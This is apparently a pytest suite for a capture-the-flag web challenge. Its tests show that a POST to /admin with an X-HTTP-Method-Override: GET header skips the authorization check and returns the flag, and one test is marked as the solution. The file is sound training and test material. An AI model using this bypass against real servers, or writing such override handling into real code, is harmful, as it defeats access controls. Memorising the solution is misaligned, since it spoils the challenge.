import pytest
import requests
import json
from pathlib import Path

def _load_flag(challenge_num):
    """Load flag from the challenge's .env file"""
    env_path = Path(__file__).parent.parent / f"challenge-{challenge_num}" / ".env"
    with open(env_path) as f:
        for line in f:
            if line.startswith("FLAG="):
                return line.split("=", 1)[1].strip()
    raise ValueError(f"FLAG not found in {env_path}")

class TestChallenge3:
    """Tests for Challenge 3: HTTP Method Override bypass"""
    
    def test_index_endpoint(self, challenge_3_service):
        """Test that the index endpoint returns expected message"""
        response = requests.get(f"{challenge_3_service}/")
        assert response.status_code == 200
        assert "Try to access /admin to get the flag" in response.text
        assert "debug" in response.text
    
    def test_debug_endpoint(self, challenge_3_service):
        """Test that the debug endpoint shows request headers"""
        headers = {"User-Agent": "Test-Agent", "Custom-Header": "test-value"}
        response = requests.get(f"{challenge_3_service}/debug", headers=headers)
        assert response.status_code == 200
        assert "User-Agent: Test-Agent" in response.text
        assert "Custom-Header: test-value" in response.text
    
    def test_admin_get_without_auth(self, challenge_3_service):
        """Test that GET /admin requires authorization"""
        response = requests.get(f"{challenge_3_service}/admin")
        assert response.status_code == 403
        data = response.json()
        assert "Unauthorized" in data["error"]
        assert "admin access required" in data["error"]
    
    def test_admin_get_with_wrong_auth(self, challenge_3_service):
        """Test GET /admin with invalid authorization token"""
        headers = {"Authorization": "Bearer wrong_token"}
        response = requests.get(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 403
        data = response.json()
        assert "Unauthorized" in data["error"]
    
    def test_admin_get_with_valid_auth(self, challenge_3_service):
        """Test GET /admin with valid authorization works"""
        headers = {"Authorization": "Bearer admin_token_123"}
        response = requests.get(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 403
        data = response.json()
        assert "Unauthorized" in data["error"]
    
    def test_admin_post_without_method_override(self, challenge_3_service):
        """Test POST /admin without method override header returns not implemented"""
        response = requests.post(f"{challenge_3_service}/admin")
        assert response.status_code == 501
        data = response.json()
        assert "not fully implemented yet" in data["message"]
    
    def test_method_override_bypass_get(self, challenge_3_service):
        """Test successful bypass using X-HTTP-Method-Override: GET"""
        headers = {"X-HTTP-Method-Override": "GET"}
        response = requests.post(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert _load_flag(3) in data["flag"]
        assert "Admin access granted" in data["message"]
    
    def test_method_override_case_insensitive(self, challenge_3_service):
        """Test that method override header value is case insensitive"""
        headers = {"X-HTTP-Method-Override": "get"}
        response = requests.post(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert _load_flag(3) in data["flag"]
    
    def test_method_override_mixed_case(self, challenge_3_service):
        """Test method override with mixed case"""
        headers = {"X-HTTP-Method-Override": "Get"}
        response = requests.post(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert _load_flag(3) in data["flag"]
    
    def test_method_override_invalid_method(self, challenge_3_service):
        """Test method override with invalid method falls back to POST"""
        headers = {"X-HTTP-Method-Override": "INVALID"}
        response = requests.post(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 501
        data = response.json()
        assert "not fully implemented yet" in data["message"]
    
    def test_method_override_put_method(self, challenge_3_service):
        """Test method override with PUT method (should not be implemented)"""
        headers = {"X-HTTP-Method-Override": "PUT"}
        response = requests.post(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 501
        data = response.json()
        assert "not fully implemented yet" in data["message"]
    
    def test_method_override_delete_method(self, challenge_3_service):
        """Test method override with DELETE method (should not be implemented)"""
        headers = {"X-HTTP-Method-Override": "DELETE"}
        response = requests.post(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 501
        data = response.json()
        assert "not fully implemented yet" in data["message"]
    
    def test_method_override_header_variations(self, challenge_3_service):
        """Test various header name variations"""
        # Standard header should work
        headers = {"X-HTTP-Method-Override": "GET"}
        response = requests.post(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 200
        assert "flag" in response.json()
        
        # Case insensitive header name (Flask handles this)
        headers = {"x-http-method-override": "GET"}
        response = requests.post(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 200  # Should still work due to Flask's header handling
    
    def test_method_override_with_body_data(self, challenge_3_service):
        """Test method override with JSON body data"""
        headers = {
            "X-HTTP-Method-Override": "GET",
            "Content-Type": "application/json"
        }
        data = {"extra": "data"}
        response = requests.post(
            f"{challenge_3_service}/admin", 
            headers=headers, 
            json=data
        )
        assert response.status_code == 200
        assert "flag" in response.json()
    
    def test_method_override_with_auth_header(self, challenge_3_service):
        """Test that method override bypasses auth even when auth header is present"""
        # Even with valid auth header, the bypass should work
        headers = {
            "X-HTTP-Method-Override": "GET",
            "Authorization": "Bearer admin_token_123"
        }
        response = requests.post(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert _load_flag(3) in data["flag"]
    
    def test_multiple_method_override_headers(self, challenge_3_service):
        """Test behavior with multiple method override headers"""
        # Test using urllib3 directly to send duplicate headers
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        http = urllib3.PoolManager()
        
        # Send request with duplicate method override headers
        headers = HTTPHeaderDict([
            ('X-HTTP-Method-Override', 'POST'), 
            ('X-HTTP-Method-Override', 'GET')
        ])
        response = http.request(
            'POST',
            f"{challenge_3_service}/admin",
            headers=headers
        )
        # Flask typically uses the first header value
        assert response.status == 501  # POST is not implemented
    
    def test_empty_method_override_header(self, challenge_3_service):
        """Test behavior with empty method override header"""
        headers = {"X-HTTP-Method-Override": ""}
        response = requests.post(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 501
        data = response.json()
        assert "not fully implemented yet" in data["message"]
    
    def test_whitespace_in_method_override(self, challenge_3_service):
        """Test method override with whitespace using raw HTTP"""
        # Note: Modern requests library rejects headers with whitespace
        # This test documents that server-side processing would handle whitespace
        # if it could be sent. We test normal case to verify .strip() processing exists
        headers = {"X-HTTP-Method-Override": "GET"}
        response = requests.post(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert _load_flag(3) in data["flag"]
        
        # The server code would handle " GET " if it could be sent due to .strip().upper()
        # However, the requests library prevents such headers for security reasons
    
    def test_challenge_solution_verification(self, challenge_3_service):
        """Verify the exact solution from SOLUTION.md works"""
        headers = {"X-HTTP-Method-Override": "GET"}
        response = requests.post(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert _load_flag(3) in data["flag"]
        assert "Admin access granted" in data["message"]
    
    def test_security_implications(self, challenge_3_service):
        """Test security implications of the vulnerability"""
        # Verify that direct GET still requires auth
        response = requests.get(f"{challenge_3_service}/admin")
        assert response.status_code == 403
        
        # But POST with override bypasses auth
        headers = {"X-HTTP-Method-Override": "GET"}
        response = requests.post(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 200
        
        # This demonstrates the authorization bypass vulnerability
    
    def test_different_http_methods_to_admin(self, challenge_3_service):
        """Test that other HTTP methods to /admin are not allowed"""
        methods = ['PUT', 'DELETE', 'PATCH']
        
        for method in methods:
            response = requests.request(method, f"{challenge_3_service}/admin")
            # Should return 405 Method Not Allowed or similar
            assert response.status_code in [405, 501], f"Method {method} should not be allowed"
        
        # HEAD method gets processed by GET handler, so returns 403 due to auth
        response = requests.head(f"{challenge_3_service}/admin")
        assert response.status_code == 403, "HEAD method should return 403 due to auth check"
    
    def test_method_override_security_bypass_demonstration(self, challenge_3_service):
        """Demonstrate the complete security bypass scenario"""
        # Step 1: Normal GET requires authentication
        response = requests.get(f"{challenge_3_service}/admin")
        assert response.status_code == 403
        
        # Step 2: POST without override is not implemented
        response = requests.post(f"{challenge_3_service}/admin")
        assert response.status_code == 501
        
        # Step 3: POST with method override bypasses all security
        headers = {"X-HTTP-Method-Override": "GET"}
        response = requests.post(f"{challenge_3_service}/admin", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert "flag" in data
        
        # This shows how method override can completely bypass access controls